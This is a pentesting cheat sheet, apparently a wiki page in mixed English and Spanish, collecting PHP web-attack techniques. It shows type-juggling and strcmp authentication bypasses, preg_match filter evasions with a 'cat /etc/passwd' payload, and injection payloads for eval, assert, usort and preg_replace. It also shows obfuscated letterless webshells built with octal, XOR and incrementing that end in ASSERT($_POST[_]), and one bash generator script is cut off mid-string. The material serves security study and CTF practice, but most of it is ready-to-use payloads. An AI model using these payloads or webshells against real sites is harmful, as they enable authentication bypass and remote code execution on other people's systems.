<h1 id="PHP-Tricks-SPA"><a href="#PHP-Tricks-SPA" class="headerlink" title="PHP Tricks (SPA)"></a>PHP Tricks (SPA)</h1><h2 id="Cookies-common-location"><a href="#Cookies-common-location" class="headerlink" title="Cookies common location:"></a>Cookies common location:</h2><p>This is also valid for phpMyAdmin cookies.</p>
<p>Cookies:</p>
<pre><code class="text">PHPSESSID
phpMyAdmin
</code></pre>
<p>Locations:</p>
<pre><code class="text">/var/lib/php/sessions
</code></pre>
<h2 id="Bypassing-PHP-comparisons"><a href="#Bypassing-PHP-comparisons" class="headerlink" title="Bypassing PHP comparisons"></a>Bypassing PHP comparisons</h2><h3 id="Loose-comparisons-Type-Juggling"><a href="#Loose-comparisons-Type-Juggling" class="headerlink" title="Loose comparisons/Type Juggling ( == )"></a>Loose comparisons/Type Juggling ( == )</h3><p>PHP comparison tables: <a href="https://www.php.net/manual/en/types.comparisons.php" target="_blank" rel="noopener">https://www.php.net/manual/en/types.comparisons.php</a></p>
<p><img src="../../../.gitbook/assets/image%20(123).png"></p>
<p><img src="../../.gitbook/assets/en-php-loose-comparison-type-juggling-owasp.pdf"></p>
<ul>
<li><code>&quot;string&quot; == 0 -&gt; True</code> ****A string which doesn’t start with a number is equals to a number</li>
<li><code>&quot;0xAAAA&quot; == &quot;43690&quot; -&gt; True</code> Strings composed by numbers in dec or hex format can be compare to other numbers/strings with True as result if the numbers were the same (numbers in a string are interpreted as numbers)</li>
<li><code>&quot;0e3264578&quot; == 0 --&gt; True</code> A string starting with “0e” and followed by anything will be equals to 0</li>
<li><code>&quot;0X3264578&quot; == 0X --&gt; True</code> A string starting with “0” and followed by any letter (X can be any letter) and followed by anything will be equals to 0</li>
<li><code>&quot;0e12334&quot; == &quot;0&quot; --&gt; True</code> This is very interesting because in some cases yo can control the string input of “0” and some content that is being hashed and compared to it. Therefore, if you can provide a value that will create a hash starting with “0e” and without any letter, you could bypass the comparison. You can find <strong>already hashed strings</strong> with this format here: <a href="https://github.com/spaze/hashes" target="_blank" rel="noopener">https://github.com/spaze/hashes</a></li>
<li><code>&quot;X&quot; == 0 --&gt; True</code> Any letter in a string is equals to int 0</li>
</ul>
<p>Con estas igualdades se pueden bypasear comparaciones de PHP (teniendo en cuenta que todo lo que se manda por parámetros normales de formulario siempre son strings).<br>Sobre todo usando el truco de String que empieza por “0e” siempre es igual a “0”, así si hay que pasar un hmac y podemos alterar valores, podemos enviar como hmac simplemente “0” y si el hmac sale que vale “0eXXXXXXXXXXX” pues dará correcto y se lo tragará<br>Se puede intentar enviar los datos encodeados como json a ver si los lee (hay que cambiar la cabecera de tipo de datos para decir que es json y rezar para que se lo coma) (en json se elige el tipo de datos)</p>
<p><a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09" target="_blank" rel="noopener">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></p>
<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a><strong>in_array()</strong></h3><p><strong>Type Juggling</strong> also affects to the <code>in_array()</code> function by default (you need to set to true the third argument to make an strict comparison):</p>
<pre><code class="php">$values = array(&quot;apple&quot;,&quot;orange&quot;,&quot;pear&quot;,&quot;grape&quot;);
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
</code></pre>
<h3 id="strcmp-strcasecmp"><a href="#strcmp-strcasecmp" class="headerlink" title="**strcmp()/**strcasecmp()"></a>**strcmp()/**strcasecmp()</h3><p>If this function is used for <strong>any authentication check</strong> (like checking the password) and the user controls one side of the comparison, he can send an empty array instead of a string as the value of the password (<code>https://example.com/login.php/?username=admin&amp;password[]=</code>) and bypass this check:</p>
<pre><code class="php">if (!strcmp(&quot;real_pwd&quot;,&quot;real_pwd&quot;)) { echo &quot;Real Password&quot;; } else { echo &quot;No Real Password&quot;; }
// Real Password
if (!strcmp(array(),&quot;real_pwd&quot;)) { echo &quot;Real Password&quot;; } else { echo &quot;No Real Password&quot;; }
// Real Password
</code></pre>
<p>The same error occurs with <code>strcasecmp()</code></p>
<h3 id="Strict-type-Juggling"><a href="#Strict-type-Juggling" class="headerlink" title="Strict type Juggling"></a>Strict type Juggling</h3><p>Even if <code>===</code> is <strong>being used</strong> there could be errors that makes the <strong>comparison vulnerable</strong> to <strong>type juggling</strong>. For example, if the comparison is <strong>converting the data to a different type of object before comparing</strong>:</p>
<pre><code class="php">(int) &quot;1abc&quot; === (int) &quot;1xyz&quot; //This will be true
</code></pre>
<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match(/^.*/)"></a>preg_match(/^.*/)</h3><p><strong><code>preg_match()</code></strong> could be used to <strong>validate user input</strong> (it <strong>checks</strong> if any <strong>word/regex</strong> from a <strong>blacklist</strong> is <strong>present</strong> on the <strong>user input</strong> and if it’s not, the code can continue it’s execution).</p>
<h4 id="New-line-bypass"><a href="#New-line-bypass" class="headerlink" title="New line bypass"></a>New line bypass</h4><p>However, when delimiting the start of the regexp<code>preg_match()</code> <strong>only checks the first line of the user input</strong>, then if somehow you can <strong>send</strong> the input in <strong>several lines</strong>, you could be able to bypass this check. Example:</p>
<pre><code class="php">$myinput=&quot;aaaaaaa
11111111&quot;; //Notice the new line
echo preg_match(&quot;/1/&quot;,$myinput);
//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
echo preg_match(&quot;/1.*$/&quot;,$myinput);
//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
echo preg_match(&quot;/^.*1/&quot;,$myinput);
//0  --&gt; In this scenario preg_match DOESN&#39;T find the char &quot;1&quot;
echo preg_match(&quot;/^.*1.*$/&quot;,$myinput);
//0  --&gt; In this scenario preg_match DOESN&#39;T find the char &quot;1&quot;
</code></pre>
<p>To bypass this check you could <strong>send the value with new-lines urlencoded</strong> (<code>%0A</code>) or if you can send <strong>JSON data</strong>, send it in <strong>several lines</strong>:</p>
<pre><code class="php">{
  &quot;cmd&quot;: &quot;cat /etc/passwd&quot;
}
</code></pre>
<p>Find an example here: <a href="https://ramadistra.dev/fbctf-2019-rceservice" target="_blank" rel="noopener">https://ramadistra.dev/fbctf-2019-rceservice</a></p>
<h4 id="Length-error-bypass"><a href="#Length-error-bypass" class="headerlink" title="Length error bypass"></a><strong>Length error bypass</strong></h4><p>(This bypass was tried apparently on PHP 5.2.5 and I couldn’t make it work on PHP 7.3.15)<br>If you can send to <code>preg_match()</code> a valid very <strong>large input</strong>, it <strong>won’t be able to process it</strong> and you will be able to <strong>bypass</strong> the check. For example, if it is blacklisting a JSON you could send:</p>
<pre><code class="text">payload = &#39;{&quot;cmd&quot;: &quot;ls -la&quot;, &quot;injected&quot;: &quot;&#39;+ &quot;a&quot;*1000000 + &#39;&quot;}&#39;
</code></pre>
<p>From: <a href="https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0</a></p>
<h2 id="More-tricks"><a href="#More-tricks" class="headerlink" title="More tricks"></a>More tricks</h2><p><strong>register_globals</strong>: En PHP &lt; 4.1.1 o si se ha configurado mal puede ser que las register_globals estén activas (o se esté imitando su comportamiento). Esto implica que en variables globales como $_GET si estas poseen un valor por ejemplo $_GET[“param”]=”1234”, puedes acceder a este mediante $param. Por lo tanto, enviando parámetros de Get o Post se pueden sobreescribir variables que se usan dentro del código.</p>
<p>Las <strong>variables de sesión</strong> (asociadas al <strong>PHPSESSION</strong>) de un dominio se guardan en el mismo sitio, por lo tanto si dentro de un dominio se usan distintas cookies en distintos paths se puede hacer que un path acceda a la cookie del otro accediendo a dicho path con la cookie del otro. De esta forma si los dos paths acceden a una variable con el mismo nombre puedes hacer que el valor de dicha variable en el path1 se aplique al path2. Y entonces el path2 tomará como válidas las variables del path1 (al ponerle a la cookie el nombre que le corresponde en el path2).</p>
<p>Dos usuarios generados a la vez pueden tener la misma cookie (si la cookie depende del tiempo).</p>
<p>When you have the <strong>usernames</strong> of teh users of the machine. Check the address: <strong>/~&lt;USERNAME&gt;</strong> to see if the php directories are activated.</p>
<p>****<a href="../../../pentesting-web/file-inclusion.md"><strong>LFI and RCE using php wrappers</strong></a>****</p>
<h2 id="Code-execution"><a href="#Code-execution" class="headerlink" title="Code execution"></a>Code execution</h2><p><strong>system(“ls”);<br>`ls`;<br>shell_exec(“ls”);</strong></p>
<p><a href="php-useful-functions.md">Check this for more useful PHP functions</a></p>
<h3 id="Code-execution-using-preg-replace"><a href="#Code-execution-using-preg-replace" class="headerlink" title="Code execution using preg_replace()"></a><strong>Code execution using</strong> <strong>preg_replace()</strong></h3><pre><code class="php">preg_replace(pattern,replace,base)
preg_replace(&quot;/a/e&quot;,&quot;phpinfo()&quot;,&quot;whatever&quot;)
</code></pre>
<p>To execute the code in the “replace” argument is needed at least one match.<br>This option of preg_replace has been <strong>deprecated as of PHP 5.5.0.</strong></p>
<h3 id="Code-execution-with-Eval"><a href="#Code-execution-with-Eval" class="headerlink" title="Code execution with Eval()"></a><strong>Code execution with Eval()</strong></h3><pre><code class="text">&#39;.system(&#39;uname -a&#39;); $dummy=&#39;
&#39;.system(&#39;uname -a&#39;);#
&#39;.system(&#39;uname -a&#39;);//
&#39;.phpinfo().&#39;
&lt;?php phpinfo(); ?&gt;
</code></pre>
<h3 id="Code-execution-with-Assert"><a href="#Code-execution-with-Assert" class="headerlink" title="Code execution with Assert()"></a><strong>Code execution with Assert()</strong></h3><p>Esta función dentro de php permite ejecutar código que está escrito en un string con el objetivo de que se devuelva true o false (y dependiendo de esto alterar la ejecución). Por lo general se introducirá la variable del usuario entre medias de un string. Por ejemplo: assert(“strpos($_GET[‘page’]),’..’) === false”) –&gt; En este caso el payload para ejecutar un comando podría ser:</p>
<pre><code class="text">?page=a&#39;,&#39;NeVeR&#39;) === false and system(&#39;ls&#39;) and strpos(&#39;a
</code></pre>
<p>El caso es que hay que romper la query, ejecutar algo y volver a arreglarla (para ello nos servimos del “and” o “%26%26” o “|“ –&gt; el “or”, “||“ no funcionan pues si la primera es cierta deja de ejecutar y el “;” no funciona pues solo ejecuta la primera parte).</p>
<p><strong>Other option</strong> is to add to the string the execution of the command:  <em>‘.highlight_file(‘.passwd’).’</em></p>
<p><strong>Other option</strong> (if you have the internal code) is to modify some variable to alter the execution: <em>$file = “hola”</em></p>
<h3 id="Code-execution-with-usort"><a href="#Code-execution-with-usort" class="headerlink" title="Code execution with usort()"></a><strong>Code execution with usort()</strong></h3><p>This function is used to sort an array of items using an specific function.<br>To abuse this function:</p>
<pre><code class="php">&lt;?php usort(VALUE, &quot;cmp&quot;); #Being cmp a valid function ?&gt;
VALUE: );phpinfo();#

&lt;?php usort();phpinfo();#, &quot;cmp&quot;); #Being cmp a valid function ?&gt;
</code></pre>
<pre><code class="php">&lt;?php
function foo($x,$y){
    usort(VALUE, &quot;cmp&quot;);
}?&gt;
VALUE: );}[PHP CODE];#

&lt;?php
function foo($x,$y){
    usort();}phpinfo;#, &quot;cmp&quot;);
}?&gt;
</code></pre>
<p>You can also use <strong>//</strong> to comment the rest of the code.</p>
<p>To discover the number of parenthesis that you need to close:</p>
<ul>
<li><code>?order=id;}//</code>: we get an error message (<code>Parse error: syntax error, unexpected &#39;;&#39;</code>). We are probably missing one or more brackets.</li>
<li><code>?order=id);}//</code>: we get a <strong>warning</strong>. That seems about right.</li>
<li><code>?order=id));}//</code>: we get an error message (<code>Parse error: syntax error, unexpected &#39;)&#39; i</code>). We probably have too many closing brackets.</li>
</ul>
<h3 id="Code-execution-via-httaccess"><a href="#Code-execution-via-httaccess" class="headerlink" title="Code execution via .httaccess"></a><strong>Code execution via .httaccess</strong></h3><p>If you can <strong>upload</strong> a <strong>.htaccess</strong>, then you can <strong>configure</strong> several things and even execute code (configuring that files with extension .htaccess can be <strong>executed</strong>).</p>
<p>Different .htaccess shells can be found <a href="https://github.com/wireghoul/htshells" target="_blank" rel="noopener">here</a></p>
<h2 id="PHP-Static-analysis"><a href="#PHP-Static-analysis" class="headerlink" title="PHP Static analysis"></a>PHP Static analysis</h2><p>Look if you can insert code in calls to these functions (from <a href="https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be" target="_blank" rel="noopener">here</a>):</p>
<pre><code class="php">exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
</code></pre>
<p>If yo are debugging a PHP application you can globally enable error printing in<code>/etc/php5/apache2/php.ini</code> adding <code>display_errors = On</code> and restart apache : <code>sudo systemctl restart apache2</code></p>
<h2 id="Execute-PHP-without-letters"><a href="#Execute-PHP-without-letters" class="headerlink" title="Execute PHP without letters"></a>Execute PHP without letters</h2><p><a href="https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/" target="_blank" rel="noopener">https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/</a></p>
<h3 id="Using-octal"><a href="#Using-octal" class="headerlink" title="Using octal"></a>Using octal</h3><pre><code class="php">$_=&quot;\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)&quot;; #system(cat .passwd);
</code></pre>
<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a><strong>XOR</strong></h3><pre><code class="php">$_=(&quot;%28&quot;^&quot;[&quot;).(&quot;%33&quot;^&quot;[&quot;).(&quot;%34&quot;^&quot;[&quot;).(&quot;%2c&quot;^&quot;[&quot;).(&quot;%04&quot;^&quot;[&quot;).(&quot;%28&quot;^&quot;[&quot;).(&quot;%34&quot;^&quot;[&quot;).(&quot;%2e&quot;^&quot;[&quot;).(&quot;%29&quot;^&quot;[&quot;).(&quot;%38&quot;^&quot;[&quot;).(&quot;%3e&quot;^&quot;[&quot;); #show_source
$__=(&quot;%0f&quot;^&quot;!&quot;).(&quot;%2f&quot;^&quot;_&quot;).(&quot;%3e&quot;^&quot;_&quot;).(&quot;%2c&quot;^&quot;_&quot;).(&quot;%2c&quot;^&quot;_&quot;).(&quot;%28&quot;^&quot;_&quot;).(&quot;%3b&quot;^&quot;_&quot;); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
</code></pre>
<h3 id="XOR-Shellcode-inside-eval"><a href="#XOR-Shellcode-inside-eval" class="headerlink" title="XOR Shellcode (inside eval)"></a>XOR Shellcode (inside eval)</h3><pre><code class="bash">#!/bin/bash

if [[ -z $1 ]]; then
  echo &quot;USAGE: $0 CMD&quot;
  exit
fi

CMD=$1
CODE=&quot;\$_=&#39;\
</code></pre>
<h3 id="Perl-like"><a href="#Perl-like" class="headerlink" title="Perl like"></a>Perl like</h3><pre><code class="php">&lt;?php
$_=[];
$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;
$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
 
$____=&#39;_&#39;;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
 
$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
</code></pre>
